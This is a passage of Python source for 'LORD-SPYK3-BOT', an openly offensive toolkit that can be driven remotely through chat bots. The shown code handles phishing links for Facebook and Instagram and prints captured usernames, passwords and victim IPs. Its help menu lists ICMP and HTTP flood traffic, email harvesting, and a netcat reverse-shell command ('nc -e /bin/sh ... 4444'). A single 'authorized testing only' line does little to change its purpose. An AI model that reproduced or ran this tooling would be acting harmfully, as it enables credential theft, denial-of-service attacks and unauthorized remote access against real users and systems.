    def _handle_phishing_status(self) -> Dict[str, Any]:
        if self.social.phishing_server:
            return {'success': True, 'output': f"Server running on {self.social.get_server_url()}"}
        else:
            return {'success': True, 'output': "No active phishing server"}
    
    def _handle_phishing_links(self) -> Dict[str, Any]:
        links = self.social.get_active_links()
        if not links:
            return {'success': True, 'output': 'No active phishing links'}
        
        output = "🎣 Active Phishing Links:\n\n"
        for link in links:
            output += f"  • {link['link_id']} - {link['platform']} ({link['created']})\n"
        
        return {'success': True, 'output': output}
    
    def _handle_phishing_credentials(self, args: List[str]) -> Dict[str, Any]:
        link_id = args[0] if args else None
        creds = self.social.get_captured_credentials(link_id)
        
        if not creds:
            return {'success': True, 'output': 'No captured credentials found'}
        
        output = "🎣 Captured Credentials:\n\n"
        for cred in creds[:10]:
            output += f"  • {cred['username']}:{cred['password']} from {cred['ip_address']}\n"
            output += f"    Time: {cred['timestamp'][:19]}\n\n"
        
        return {'success': True, 'output': output}
    
    def _handle_phishing_qr(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: phishing_qr <link_id>'}
        
        qr_path = self.social.generate_qr_code(args[0])
        if qr_path:
            return {'success': True, 'output': f"QR code saved to {qr_path}"}
        else:
            return {'success': False, 'output': 'Failed to generate QR code'}
    
    def _handle_phishing_shorten(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: phishing_shorten <link_id>'}
        
        short_url = self.social.shorten_url(args[0])
        if short_url:
            return {'success': True, 'output': f"Shortened URL: {short_url}"}
        else:
            return {'success': False, 'output': 'Failed to shorten URL'}
    
    # ==================== IP Management Handlers ====================
    def _handle_add_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        
        if self.db.add_managed_ip(ip, 'system', notes):
            return {'success': True, 'output': f"✅ IP {ip} added to monitoring"}
        else:
            return {'success': False, 'output': f"Failed to add IP {ip}"}
    
    def _handle_remove_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: remove_ip <ip>'}
        
        ip = args[0]
        if self.db.remove_managed_ip(ip):
            return {'success': True, 'output': f"✅ IP {ip} removed from monitoring"}
        else:
            return {'success': False, 'output': f"IP {ip} not found"}
    
    def _handle_block_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
        
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
        
        if self.monitor.block_ip(ip, reason, 'system'):
            return {'success': True, 'output': f"✅ IP {ip} blocked: {reason}"}
        else:
            return {'success': False, 'output': f"Failed to block IP {ip}"}
    
    def _handle_unblock_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: unblock_ip <ip>'}
        
        ip = args[0]
        if self.monitor.unblock_ip(ip, 'system'):
            return {'success': True, 'output': f"✅ IP {ip} unblocked"}
        else:
            return {'success': False, 'output': f"Failed to unblock IP {ip}"}
    
    def _handle_list_ips(self, args: List[str]) -> Dict[str, Any]:
        include_blocked = not (args and args[0] == 'active')
        ips = self.db.get_managed_ips(include_blocked)
        
        if not ips:
            return {'success': True, 'output': 'No managed IPs found'}
        
        output = "🔒 Managed IPs:\n\n"
        for ip in ips:
            status = "🔴 BLOCKED" if ip['is_blocked'] else "🟢 ACTIVE"
            output += f"  • {ip['ip_address']} - {status}\n"
            if ip.get('notes'):
                output += f"    Notes: {ip['notes']}\n"
        
        return {'success': True, 'output': output}
    
    def _handle_ip_info(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: ip_info <ip>'}
        
        ip = args[0]
        
        # Get location
        location = self.network.get_ip_location(ip)
        
        # Get database info
        db_info = self.db.get_ip_info(ip)
        
        # Get threats
        threats = self.db.get_threats_by_ip(ip, 5)
        
        output = f"""
🔍 IP Information for {ip}
=====================================

📍 Location:
  Country: {location.get('country', 'Unknown')}
  Region: {location.get('region', 'Unknown')}
  City: {location.get('city', 'Unknown')}
  ISP: {location.get('isp', 'Unknown')}

📊 Status:
"""
        if db_info:
            output += f"  Monitored: ✅\n"
            output += f"  Added: {db_info.get('added_date', 'Unknown')[:19]}\n"
            output += f"  Blocked: {'✅' if db_info.get('is_blocked') else '❌'}\n"
            if db_info.get('block_reason'):
                output += f"  Block Reason: {db_info['block_reason']}\n"
        else:
            output += "  Monitored: ❌\n"

        if threats:
            output += f"\n🚨 Recent Threats:\n"
            for threat in threats[:3]:
                output += f"  • {threat['threat_type']} - {threat['timestamp'][:19]}\n"
        
        return {'success': True, 'output': output}
    
    # ==================== Network Diagnostic Handlers ====================
    def _handle_ping(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: ping <target>'}
        
        result = self.network.ping(args[0])
        output = result.get('output', '')
        if result.get('avg_rtt'):
            output += f"\nAverage RTT: {result['avg_rtt']}ms"
        output += f"\nPacket Loss: {result.get('packet_loss', 0)}%"
        return {'success': result['success'], 'output': output}
    
    def _handle_traceroute(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        
        result = self.network.traceroute(args[0])
        return {'success': result['success'], 'output': result.get('output', '')}
    
    def _handle_nmap(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [options]'}
        
        target = args[0]
        options = ' '.join(args[1:]) if len(args) > 1 else ''
        
        result = self.network.nmap(target, options)
        output = result.get('output', '')
        if result.get('open_ports'):
            output += f"\n\nOpen Ports: {len(result['open_ports'])}"
            for port in result['open_ports'][:20]:
                output += f"\n  {port['port']}/{port['protocol']} - {port['service']}"
        
        return {'success': result['success'], 'output': output}
    
    def _handle_curl(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: curl <url> [options]'}
        
        url = args[0]
        options = ' '.join(args[1:]) if len(args) > 1 else ''
        
        result = self.network.curl(url, options)
        return {'success': result['success'], 'output': result.get('output', '')}
    
    def _handle_wget(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: wget <url> [options]'}
        
        url = args[0]
        options = ' '.join(args[1:]) if len(args) > 1 else ''
        
        result = self.network.wget(url, options)
        return {'success': result['success'], 'output': result.get('output', '')}
    
    def _handle_nc(self, args: List[str]) -> Dict[str, Any]:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc <host> <port> [options]'}
        
        host = args[0]
        try:
            port = int(args[1])
        except:
            return {'success': False, 'output': f'Invalid port: {args[1]}'}
        
        options = ' '.join(args[2:]) if len(args) > 2 else ''
        
        result = self.network.netcat(host, port, options)
        return {'success': result['success'], 'output': result.get('output', '')}
    
    def _handle_whois(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        
        result = self.network.whois(args[0])
        return {'success': result['success'], 'output': result.get('output', '')}
    
    def _handle_dns(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: dns <domain> [record_type]'}
        
        domain = args[0]
        record_type = args[1] if len(args) > 1 else 'A'
        
        result = self.network.dig(domain, record_type)
        return {'success': result['success'], 'output': result.get('output', '')}
    
    def _handle_location(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': 'Usage: location <ip>'}
        
        result = self.network.get_ip_location(args[0])
        if result['success']:
            output = f"""
📍 IP Location: {result['ip']}
=====================================

Country: {result.get('country', 'Unknown')}
Region: {result.get('region', 'Unknown')}
City: {result.get('city', 'Unknown')}
ISP: {result.get('isp', 'Unknown')}
Coordinates: {result.get('lat', 0)}, {result.get('lon', 0)}
"""
            return {'success': True, 'output': output}
        else:
            return {'success': False, 'output': result.get('error', 'Location lookup failed')}
    
    def _handle_system(self) -> Dict[str, Any]:
        cpu = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        boot_time = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')
        
        output = f"""
💻 System Information
=====================================

System: {platform.system()} {platform.release()}
Hostname: {socket.gethostname()}
Boot Time: {boot_time}

CPU: {cpu}% ({psutil.cpu_count()} cores)
Memory: {mem.percent}% (Used: {mem.used // (1024**3)}GB / Total: {mem.total // (1024**3)}GB)
Disk: {disk.percent}% (Used: {disk.used // (1024**3)}GB / Total: {disk.total // (1024**3)}GB)

Network:
  Local IP: {self.network.get_local_ip()}
  Bytes Sent: {psutil.net_io_counters().bytes_sent // (1024**2)}MB
  Bytes Received: {psutil.net_io_counters().bytes_recv // (1024**2)}MB
"""
        return {'success': True, 'output': output}
    
    # ==================== Bot Start Handlers ====================
    def _handle_start_discord(self) -> Dict[str, Any]:
        # This will be handled by the main app
        return {'success': True, 'output': 'Discord bot start requested. Check console for status.'}
    
    def _handle_start_telegram(self) -> Dict[str, Any]:
        return {'success': True, 'output': 'Telegram bot start requested. Check console for status.'}
    
    def _handle_start_whatsapp(self) -> Dict[str, Any]:
        return {'success': True, 'output': 'WhatsApp bot start requested. Check console for status.'}
    
    def _handle_start_signal(self) -> Dict[str, Any]:
        return {'success': True, 'output': 'Signal bot start requested. Check console for status.'}
    
    def _handle_start_slack(self) -> Dict[str, Any]:
        return {'success': True, 'output': 'Slack bot start requested. Check console for status.'}
    
    def _handle_start_imessage(self) -> Dict[str, Any]:
        return {'success': True, 'output': 'iMessage bot start requested. Check console for status.'}

# =====================
# MAIN APPLICATION
# =====================
class LordSpyk3Bot:
    """Main application class"""
    
    def __init__(self):
        self.config = self._load_config()
        self.db = DatabaseManager()
        self.executor = CommandExecutor(self.db)
        self.ssh = SSHManager(self.db)
        self.shodan = ShodanManager(self.db, self.config)
        self.hunter = HunterManager(self.db, self.config)
        self.nikto = NiktoScanner(self.db)
        self.traffic = TrafficGenerator(self.db)
        self.social = SocialEngineeringTools(self.db)
        self.time_manager = TimeManager(self.db)
        self.monitor = NetworkMonitor(self.db)
        
        self.handler = CommandHandler(
            self.db, self.executor, self.ssh, self.shodan, self.hunter,
            self.nikto, self.traffic, self.social, self.time_manager, self.monitor
        )
        
        self.discord_bot = DiscordBot(self.handler, self.db, self.monitor)
        self.telegram_bot = TelegramBot(self.handler, self.db)
        self.whatsapp_bot = WhatsAppBot(self.handler, self.db)
        self.signal_bot = SignalBot(self.handler, self.db)
        self.slack_bot = SlackBot(self.handler, self.db)
        self.imessage_bot = IMessageBot(self.handler, self.db)
        
        self.session_id = self.db.create_session("local_user")
        self.running = True
    
    def _load_config(self) -> Dict:
        """Load configuration"""
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {
            'shodan': {'enabled': False, 'api_key': ''},
            'hunter': {'enabled': False, 'api_key': ''},
            'discord': {'enabled': False, 'token': ''},
            'telegram': {'enabled': False, 'api_id': '', 'api_hash': ''}
        }
    
    def save_config(self) -> bool:
        """Save configuration"""
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
            return False
    
    def print_banner(self):
        """Print application banner"""
        banner = f"""
{Colors.BLUE1}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.BLUE2}        🕷️ LORD-SPYK3-BOT v2.0.0                    🕷️                    {Colors.BLUE1}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.BLUE3}  • 📡 5000+ Security Commands      • 🔐 SSH Remote Access (6 Platforms){Colors.BLUE1}║
║{Colors.BLUE3}  • 🌐 Complete Nmap/Curl/Wget/NC   • 🔍 Shodan & Hunter.io Integration{Colors.BLUE1}║
║{Colors.BLUE3}  • 🚀 REAL Traffic Generation      • 🎣 Social Engineering Suite       {Colors.BLUE1}║
║{Colors.BLUE3}  • 🕷️ Nikto Web Scanner            • 📊 Graphical Reports & Statistics {Colors.BLUE1}║
║{Colors.BLUE3}  • 🤖 Discord/Telegram/WhatsApp    • Signal/Slack/iMessage Integration {Colors.BLUE1}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.BLUE2}🔒 ULTIMATE CYBERSECURITY COMMAND & CONTROL SERVER{Colors.RESET}

{Colors.BLUE3}💡 Type 'help' for command list{Colors.RESET}
{Colors.BLUE3}🔐 Type 'ssh' to see SSH connections{Colors.RESET}
{Colors.BLUE3}🔍 Type 'shodan_ip 8.8.8.8' for Shodan lookup{Colors.RESET}
{Colors.BLUE3}📧 Type 'hunter_domain example.com' for email harvesting{Colors.RESET}
{Colors.BLUE3}🚀 Type 'traffic_help' for traffic generation{Colors.RESET}
        """
        print(banner)
    
    def print_help(self):
        """Print help menu"""
        help_text = f"""
{Colors.BLUE1}┌─────────────────{Colors.BLUE2} LORD-SPYK3-BOT COMMANDS {Colors.BLUE1}─────────────────┐{Colors.RESET}

{Colors.BLUE2}📡 NMAP COMMANDS:{Colors.RESET}
  !nmap -sP 192.168.1.0/24     - Ping sweep
  !nmap -sS 192.168.1.1        - SYN scan
  !nmap -sV 192.168.1.1        - Version detection
  !nmap -O 192.168.1.1         - OS detection
  !nmap -A 192.168.1.1         - Aggressive scan
  !nmap -p- 192.168.1.1        - All ports
  !nmap --script vuln          - Vulnerability scan

{Colors.BLUE2}🌐 CURL COMMANDS:{Colors.RESET}
  !curl http://example.com           - GET request
  !curl -X POST -d "data=value"      - POST request
  !curl -H "Header: value"           - Custom headers
  !curl -O http://example.com/file   - Download file

{Colors.BLUE2}📥 WGET COMMANDS:{Colors.RESET}
  !wget http://example.com/file      - Download file
  !wget -O output.html http://...    - Save with name
  !wget -r -l 5 http://...           - Recursive download

{Colors.BLUE2}🔌 NETCAT COMMANDS:{Colors.RESET}
  !nc example.com 80                 - Connect to port
  !nc -l -p 1234                     - Listen on port
  !nc -zv 192.168.1.1 1-1000         - Port scan
  !nc -e /bin/sh 192.168.1.1 4444    - Reverse shell

{Colors.BLUE2}🔐 SSH COMMANDS:{Colors.RESET}
  !ssh user@hostname                 - SSH connection
  !ssh -p 2222 user@hostname         - Custom port
  !ssh -L 8080:localhost:80 user@... - Port forwarding
  !ssh -J jumpuser@jumphost          - Jump host

{Colors.BLUE2}🔍 SHODAN COMMANDS:{Colors.RESET}
  !shodan_ip 8.8.8.8                 - IP lookup
  !shodan_search apache              - Search Shodan
  !shodan_count port:22              - Count results
  !shodan_stats                      - Usage statistics

{Colors.BLUE2}📧 HUNTER.IO COMMANDS:{Colors.RESET}
  !hunter_domain example.com         - Find emails
  !hunter_verify email@domain.com    - Verify email
  !hunter_finder domain first last   - Find specific email

{Colors.BLUE2}🚀 TRAFFIC GENERATION:{Colors.RESET}
  !generate_traffic icmp 8.8.8.8 10     - ICMP flood
  !generate_traffic http_get 192.168.1.1 30 80 - HTTP GET
  !traffic_status                       - Active generators
  !traffic_stop [id]                    - Stop generation
  !traffic_help                         - Detailed help

{Colors.BLUE2}🎣 PHISHING:{Colors.RESET}
  !generate_phishing_link_for_facebook  - Facebook page
  !generate_phishing_link_for_instagram - Instagram page
  !phishing_start_server <id> 8080      - Start server
  !phishing_credentials                 - View captured data
  !phishing_qr <id>                     - Generate QR code
  !phishing_shorten <id>                - Shorten URL

{Colors.BLUE2}🔒 IP MANAGEMENT:{Colors.RESET}
  !add_ip 192.168.1.100 [notes]         - Add IP to monitoring
  !block_ip 10.0.0.5 "Reason"           - Block IP
  !unblock_ip 10.0.0.5                  - Unblock IP
  !list_ips                             - List managed IPs
  !ip_info 8.8.8.8                      - IP information

{Colors.BLUE2}🕷️ NIKTO WEB SCANNER:{Colors.RESET}
  !nikto example.com                    - Basic web scan
  !nikto example.com -ssl               - SSL scan
  !nikto example.com -port 8443         - Custom port

{Colors.BLUE2}⏰ TIME COMMANDS:{Colors.RESET}
  !time              - Current time
  !date              - Current date
  !datetime          - Both
  !history           - Command history
  !time_history      - Time command history

{Colors.BLUE2}📊 SYSTEM COMMANDS:{Colors.RESET}
  !status            - System status
  !threats           - Recent threats
  !report            - Security report
  !system            - System information

{Colors.BLUE2}🔍 NETWORK DIAGNOSTICS:{Colors.RESET}
  !ping 8.8.8.8                      - Ping
  !traceroute google.com              - Traceroute
  !whois example.com                  - WHOIS lookup
  !dns example.com                    - DNS lookup
  !location 8.8.8.8                  - IP geolocation

{Colors.BLUE2}🤖 BOT COMMANDS:{Colors.RESET}
  !start_discord     - Start Discord bot
  !start_telegram    - Start Telegram bot
  !start_whatsapp    - Start WhatsApp bot
  !start_signal      - Start Signal bot
  !start_slack       - Start Slack bot
  !start_imessage    - Start iMessage bot

{Colors.BLUE1}└─────────────────────────────────────────────────────────────────────┘{Colors.RESET}

⚠️ For authorized security testing only
        """
        print(help_text)
    
    def check_dependencies(self):
        """Check dependencies"""
        print(f"\n{Colors.BLUE2}🔍 Checking dependencies...{Colors.RESET}")
        
        tools = ['ping', 'nmap', 'curl', 'wget', 'nc', 'ssh', 'dig']
        for tool in tools:
            if shutil.which(tool):
                print(f"{Colors.BLUE3}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}⚠️  {tool} not found{Colors.RESET}")
        
        if self.ssh.is_available():
            print(f"{Colors.BLUE3}✅ paramiko (SSH){Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}⚠️  paramiko not found. Install: pip install paramiko{Colors.RESET}")
        
        if self.shodan.is_available():
            print(f"{Colors.BLUE3}✅ shodan{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}⚠️  shodan not found. Install: pip install shodan{Colors.RESET}")
        
        if self.hunter.is_available():
            print(f"{Colors.BLUE3}✅ pyhunter{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}⚠️  pyhunter not found. Install: pip install pyhunter{Colors.RESET}")
        
        if SCAPY_AVAILABLE:
            print(f"{Colors.BLUE3}✅ scapy{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}⚠️  scapy not found. Install: pip install scapy{Colors.RESET}")
        
        if QRCODE_AVAILABLE:
            print(f"{Colors.BLUE3}✅ qrcode{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}⚠️  qrcode not found. Install: pip install qrcode[pil]{Colors.RESET}")
        
        print(f"{Colors.BLUE2}✅ Dependencies check complete{Colors.RESET}")
    
    def setup_shodan(self):
        """Setup Shodan API"""
        print(f"\n{Colors.BLUE2}🔍 Shodan API Setup{Colors.RESET}")
        print(f"{Colors.BLUE3}{'='*50}{Colors.RESET}")
        
        api_key = input(f"{Colors.BLUE3}Enter Shodan API key (or press Enter to skip): {Colors.RESET}").strip()
        if not api_key:
            print(f"{Colors.YELLOW}⚠️  Shodan setup skipped{Colors.RESET}")
            return
        
        self.config['shodan'] = {'enabled': True, 'api_key': api_key}
        self.shodan = ShodanManager(self.db, self.config)
        self.save_config()
        
        if self.shodan.is_available():
            print(f"{Colors.BLUE3}✅ Shodan configured!{Colors.RESET}")
            print(f"{Colors.BLUE3}📊 Try: shodan_ip 8.8.8.8{Colors.RESET}")
        else:
            print(f"{Colors.RED}❌ Failed to configure Shodan{Colors.RESET}")
    
    def setup_hunter(self):
        """Setup Hunter.io API"""
        print(f"\n{Colors.BLUE2}📧 Hunter.io API Setup{Colors.RESET}")
        print(f"{Colors.BLUE3}{'='*50}{Colors.RESET}")
        
        api_key = input(f"{Colors.BLUE3}Enter Hunter.io API key (or press Enter to skip): {Colors.RESET}").strip()
        if not api_key:
            print(f"{Colors.YELLOW}⚠️  Hunter.io setup skipped{Colors.RESET}")
            return
        
        self.config['hunter'] = {'enabled': True, 'api_key': api_key}
        self.hunter = HunterManager(self.db, self.config)
        self.save_config()
        
        if self.hunter.is_available():
            print(f"{Colors.BLUE3}✅ Hunter.io configured!{Colors.RESET}")
            print(f"{Colors.BLUE3}📧 Try: hunter_domain example.com{Colors.RESET}")
        else:
            print(f"{Colors.RED}❌ Failed to configure Hunter.io{Colors.RESET}")
    
    def setup_discord(self):
        """Setup Discord bot"""
        print(f"\n{Colors.BLUE2}🤖 Discord Bot Setup{Colors.RESET}")
        print(f"{Colors.BLUE3}{'='*50}{Colors.RESET}")
        
        token = input(f"{Colors.BLUE3}Enter Discord bot token (or press Enter to skip): {Colors.RESET}").strip()
        if not token:
            print(f"{Colors.YELLOW}⚠️  Discord setup skipped{Colors.RESET}")
            return
        
        channel = input(f"{Colors.BLUE3}Enter channel ID (optional): {Colors.RESET}").strip()
        prefix = input(f"{Colors.BLUE3}Enter command prefix (default: !): {Colors.RESET}").strip() or "!"
        
        if self.discord_bot.save_config(token, channel, True, prefix):
            print(f"{Colors.BLUE3}✅ Discord configured!{Colors.RESET}")
            if self.discord_bot.start_bot_thread():
                print(f"{Colors.BLUE3}✅ Discord bot started! Use '{prefix}help' in Discord{Colors.RESET}")
        else:
            print(f"{Colors.RED}❌ Failed to save Discord configuration{Colors.RESET}")
    
    def setup_telegram(self):
        """Setup Telegram bot"""
        print(f"\n{Colors.BLUE2}📱 Telegram Bot Setup{Colors.RESET}")
        print(f"{Colors.BLUE3}{'='*50}{Colors.RESET}")
        
        use_bot = input(f"{Colors.BLUE3}Use bot token? (y/n): {Colors.RESET}").strip().lower()
        
        if use_bot == 'y':
            token = input(f"{Colors.BLUE3}Enter bot token: {Colors.RESET}").strip()
            if not token:
                print(f"{Colors.YELLOW}⚠️  Telegram setup skipped{Colors.RESET}")
                return
            if self.telegram_bot.save_config('', '', token, '', True):
                print(f"{Colors.BLUE3}✅ Telegram configured!{Colors.RESET}")
                if self.telegram_bot.start_bot_thread():
                    print(f"{Colors.BLUE3}✅ Telegram bot started! Use /help in Telegram{Colors.RESET}")
        else:
            api_id = input(f"{Colors.BLUE3}Enter API ID: {Colors.RESET}").strip()
            if not api_id:
                print(f"{Colors.YELLOW}⚠️  Telegram setup skipped{Colors.RESET}")
                return
            api_hash = input(f"{Colors.BLUE3}Enter API Hash: {Colors.RESET}").strip()
            phone = input(f"{Colors.BLUE3}Enter phone number: {Colors.RESET}").strip()
            if self.telegram_bot.save_config(api_id, api_hash, '', phone, True):
                print(f"{Colors.BLUE3}✅ Telegram configured!{Colors.RESET}")
                if self.telegram_bot.start_bot_thread():
                    print(f"{Colors.BLUE3}✅ Telegram bot started! Use /help in Telegram{Colors.RESET}")
    
    def run(self):
        """Main application loop"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        self.check_dependencies()
        
        # Setup APIs if not configured
        if not self.shodan.is_available():
            setup = input(f"\n{Colors.BLUE3}Setup Shodan? (y/n): {Colors.RESET}").strip().lower()
            if setup == 'y':
                self.setup_shodan()
        
        if not self.hunter.is_available():
            setup = input(f"\n{Colors.BLUE3}Setup Hunter.io? (y/n): {Colors.RESET}").strip().lower()
            if setup == 'y':
                self.setup_hunter()
        
        # Setup bots if not configured
        if not self.discord_bot.config.get('enabled'):
            setup = input(f"\n{Colors.BLUE3}Setup Discord bot? (y/n): {Colors.RESET}").strip().lower()
            if setup == 'y':
                self.setup_discord()
        
        if not self.telegram_bot.config.get('enabled'):
            setup = input(f"\n{Colors.BLUE3}Setup Telegram bot? (y/n): {Colors.RESET}").strip().lower()
            if setup == 'y':
                self.setup_telegram()
        
        # Start monitoring
        start_monitor = input(f"\n{Colors.BLUE3}Start threat monitoring? (y/n): {Colors.RESET}").strip().lower()
        if start_monitor == 'y':
            self.monitor.start_monitoring()
            print(f"{Colors.BLUE3}✅ Threat monitoring started{Colors.RESET}")
        
        # Enable auto-block
        auto_block = input(f"\n{Colors.BLUE3}Enable auto-blocking? (y/n): {Colors.RESET}").strip().lower()
        if auto_block == 'y':
            self.monitor.auto_block = True
            try:
                threshold = int(input(f"{Colors.BLUE3}Alert threshold (default: 5): {Colors.RESET}").strip() or "5")
                self.monitor.auto_block_threshold = threshold
            except:
                pass
            print(f"{Colors.BLUE3}✅ Auto-block enabled (threshold: {self.monitor.auto_block_threshold}){Colors.RESET}")
        
        print(f"\n{Colors.BLUE2}✅ Tool ready! Session ID: {self.session_id}{Colors.RESET}")
        print(f"{Colors.BLUE3}   Type 'help' for commands, 'traffic_help' for traffic generation.{Colors.RESET}")
        print(f"{Colors.BLUE3}   Try 'time', 'date', 'datetime' for time commands.{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.BLUE1}[{Colors.BLUE2}{self.session_id}{Colors.BLUE1}]{Colors.BLUE2} 🕷️> {Colors.RESET}"
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                cmd_lower = command.lower()
                
                if cmd_lower == 'exit':
                    self.running = False
                    print(f"\n{Colors.BLUE2}👋 Thank you for using LORD-SPYK3-BOT!{Colors.RESET}")
                elif cmd_lower == 'clear':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.print_banner()
                elif cmd_lower == 'help':
                    self.print_help()
                elif cmd_lower == 'start_monitor':
                    self.monitor.start_monitoring()
                    print(f"{Colors.BLUE3}✅ Threat monitoring started{Colors.RESET}")
                elif cmd_lower == 'stop_monitor':
                    self.monitor.stop_monitoring()
                    print(f"{Colors.BLUE3}🛑 Threat monitoring stopped{Colors.RESET}")
                else:
                    result = self.handler.execute(command)
                    output = result.get('output', '')
                    if isinstance(output, dict):
                        print(json.dumps(output, indent=2))
                    else:
                        print(output)
                    
                    if result.get('success'):
                        print(f"\n{Colors.BLUE3}✅ Command executed ({result.get('execution_time', 0):.2f}s){Colors.RESET}")
                    else:
                        print(f"\n{Colors.RED}❌ Command failed: {result.get('output', 'Unknown error')}{Colors.RESET}")
                        
            except KeyboardInterrupt:
                print(f"\n{Colors.BLUE2}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        self.monitor.stop_monitoring()
        self.ssh.disconnect_all()
        self.db.end_session(self.session_id)
        self.db.close()
        
        print(f"\n{Colors.BLUE2}✅ Tool shutdown complete.{Colors.RESET}")
        print(f"{Colors.BLUE3}📁 Logs: {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.BLUE3}💾 Database: {DATABASE_FILE}{Colors.RESET}")
        print(f"{Colors.BLUE3}📊 Reports: {REPORT_DIR}{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    """Main entry point"""
    try:
        print(f"{Colors.BLUE2} Starting LORD-SPYK3-BOT v2.0.0 ...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.RED}❌ Python 3.7 or higher is required{Colors.RESET}")
            sys.exit(1)
        
        # Check for root/admin for firewall operations
        needs_admin = False
        if platform.system().lower() == 'linux':
            if os.geteuid() != 0:
                needs_admin = True
        elif platform.system().lower() == 'windows':
            import ctypes
            try:
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    needs_admin = True
            except:
                pass
        
        if needs_admin:
            print(f"{Colors.YELLOW}⚠️  Running without admin/root privileges{Colors.RESET}")
            print(f"{Colors.YELLOW}   Firewall operations will not work{Colors.RESET}")
            print(f"{Colors.YELLOW}   Run with sudo/administrator for full functionality{Colors.RESET}")
            time.sleep(2)
        
        app = LordSpyk3Bot()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.BLUE2}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()